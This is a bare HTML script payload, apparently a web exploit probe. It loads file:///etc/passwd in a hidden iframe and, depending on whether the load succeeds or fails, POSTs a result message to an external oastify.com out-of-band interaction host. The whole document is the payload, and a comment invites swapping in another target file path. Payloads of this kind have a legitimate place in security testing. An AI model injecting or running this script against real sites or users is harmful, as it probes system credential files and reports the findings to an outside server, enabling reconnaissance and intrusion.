<script>
  const iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  iframe.src = 'file:///etc/passwd'; // Replace with the target file path
  document.body.appendChild(iframe);

  iframe.onload = () => {
    fetch('https://vkj12zuf60tkbsz27qjd1spjpav1j17q.oastify.com', {
      method: 'POST',
      body: 'File exists: file:///etc/passwd'
    });
  };

  iframe.onerror = () => {
    fetch('https://vkj12zuf60tkbsz27qjd1spjpav1j17q.oastify.com', {
      method: 'POST',
      body: 'Error: Could not load file:///etc/passwd'
    });
  };
</script>
